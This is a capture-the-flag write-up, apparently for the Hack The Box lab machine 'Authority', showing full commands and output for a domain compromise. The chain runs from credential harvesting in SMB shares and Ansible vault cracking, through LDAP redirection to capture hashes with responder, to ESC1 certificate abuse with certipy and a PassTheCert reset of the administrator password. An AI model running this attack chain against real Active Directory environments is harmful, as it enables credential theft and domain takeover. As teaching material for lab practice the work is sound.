# Authority

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.9.12        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 10:01 +08
Warning: 10.129.9.12 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.9.12
Host is up (0.17s latency).
Not shown: 65501 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
53/tcp    open     domain
80/tcp    open     http
88/tcp    open     kerberos-sec
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
389/tcp   open     ldap
445/tcp   open     microsoft-ds
464/tcp   open     kpasswd5
593/tcp   open     http-rpc-epmap
636/tcp   open     ldapssl
3268/tcp  open     globalcatLDAP
3269/tcp  open     globalcatLDAPssl
5985/tcp  open     wsman
8443/tcp  open     https-alt
9389/tcp  open     adws
47001/tcp open     winrm
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49671/tcp open     unknown
49686/tcp open     unknown
49687/tcp open     unknown
49689/tcp open     unknown
49690/tcp open     unknown
49707/tcp open     unknown
49710/tcp open     unknown
60905/tcp open     unknown
64054/tcp open     unknown
```

This looks like an AD machine. Did a detailed scan to fully enumerate everything.&#x20;

```
$ sudo nmap -p 53,80,88,135,139,389,445,8443 -sC -sV --min-rate 3000 10.129.9.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 10:03 +08
Nmap scan report for 10.129.9.12
Host is up (0.17s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 06:03:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2023-07-17T06:04:13+00:00; +4h00m00s from scanner time.
445/tcp  open  microsoft-ds?
8443/tcp open  ssl/https-alt
```

We can add all the domain names into our `/etc/hosts` file.&#x20;

### SMB Shares --> Ansible Creds

SMB allowed access to a few shares with no credentials:

```
$ smbmap -u 'guest' -p '' -H 10.129.9.12
[+] IP: 10.129.9.12:445 Name: 10.129.9.12                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
```

There were quite a few items within the `Development` share, such as Ansible files nad stuff like that. Within the `/Automation/Ansible/PWM/templates` folder, we can find Tomcat creds:

```
$ cat tomcat-users.xml.j2 
<?xml version='1.0' encoding='cp1252'?>

<tomcat-users xmlns="http://tomcat.apache.org/xml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
 version="1.0">

<user username="admin" password="T0mc@tAdm1n" roles="manager-gui"/>  
<user username="robot" password="T0mc@tR00t" roles="manager-script"/>

</tomcat-users>
```

Within the `ansible_inventory` file of `PWM`, we can find some credentials for Ansible:

```
$ cat ansible_inventory 
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

This suggests using WinRM, and I do know it is possible to execute commands using Ansible's WinRM module. Within the `default` directory, there's a `main.yml` file with some hashes:

```
$ cat main.yml 
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

We can try to crack these hashes using using `ansible-vault decrypt` and `john`. However, each vault has its own password that we need to crack. I read the source code to find the format required for this, including the newlines:

```
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
```

Then, we can run `john` to crack this:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes 
Using default input encoding: UTF-8
Loaded 1 password hash (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 128/128 AVX 4x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (tojohn.yml)     
1g 0:00:00:13 DONE (2023-07-17 10:38) 0.07220g/s 2874p/s 2874c/s 2874C/s 001983..victor2
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

This would give us the output:

```
$ cat tojohn.yml| ansible-vault decrypt 
Vault password: 
Decryption successful
svc_pwm 
```

We can repeat the process for the rest of the hashes. This would find two more credentials:

```
pWm_@dm!N_!23 (for login)
DevT3st@123 (for ldap)
```

### Web Enumeration --> Responder

Port 80 just shows an IIS Server. Port 8443 uses TLS and redirects me a login at `/pwm/private/login`:

<figure><img src="../../.gitbook/assets/image (1742).png" alt=""><figcaption></figcaption></figure>

We have the credentials for this, so let's try to edit the configurations. WIthin the LDAP config, we can change the LDAP URL:

<figure><img src="../../.gitbook/assets/image (1749).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to some hash capturing via `responder`. I replaced the LDAP URL with `ldap://10.10.14.9:389` and then clicked on 'Test LDAP Profile', and `responder` captured a hash:

<figure><img src="../../.gitbook/assets/image (1773).png" alt=""><figcaption></figcaption></figure>

With this, we can `evil-winrm` in to the machine:

<figure><img src="../../.gitbook/assets/image (1710).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### ESC1 + Add Computer --> Reset DA Password

Within the machine, there are some certificates available:

```
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ls cert:/Localmachine/My


   PSParentPath: Microsoft.PowerShell.Security\Certificate::Localmachine\My

Thumbprint                                Subject
----------                                -------
790DCBD9D91E34EDE37CDAD9C114C3DE1BEBA7BE  CN=authority.authority.htb
42A80DC79DD9CE76D032080B2F8B172BC29B0182  CN=AUTHORITY-CA, DC=authority, DC=htb
```

This sort of guided me towards exploiting vulnerable certificate templates. I used `certipy` to find the CA stuff.&#x20;

```
$ certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.9.12
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Saved BloodHound data to '20230717105005_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20230717105005_Certipy.txt'
[*] Saved JSON output to '20230717105005_Certipy.json'
```

Then, I looked through the certificates to see if there were any vulnerabilities. There was one vulnerability that it picked up on:

```
1
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

The `svc_ldap` user can add new computers (most of the time Domain Users can do this), thus allowing us to request for the certificate needed.&#x20;

First, add the new computer:

```
$ addcomputer.py -dc-ip 10.129.9.12 -computer-pass 'Password@123' -computer-name Evil 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -computer-group 'CN=Domain Computers, DC=authority,DC=Authority,DC=htb'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account Evil$ with password Password@123.
```

Then, use this to request for the template.&#x20;

```
$ certipy req -u 'Evil$' -p 'Password@123' -dc-ip 10.129.9.12 -ca AUTHORITY-CA -template CorpVPN -upn Administrator -debug
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.9.12[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.9.12[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

We are unable to request for a TGT using this certificate however.&#x20;

```
$ certipy auth -pfx 'administrator.pfx' -username administrator -domain authority.htb -dc-ip 10.129.9.12 
Certipy v4.4.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

This means that Rubeus would fail as well. In this case, let's try to Pass the Certificate to reset the administrator's password.&#x20;

{% embed url="https://github.com/AlmondOffSec/PassTheCert" %}

First, generate the key and cert files:

```
$ certipy cert -pfx administrator.pfx -nocert -out admin.key
$ certipy cert -pfx administrator.pfx -nokey -out admin.crt
```

Then, reset the administrator password:

```
$ python3 passthecert.py -action modify_user -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.129.8.242 -target administrator -new-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Successfully changed administrator password to: R08Fv3VKaSyyI1tJ1FYi1mAEGklJvWFy
```

<figure><img src="../../.gitbook/assets/image (1741).png" alt=""><figcaption></figcaption></figure>

Rooted!
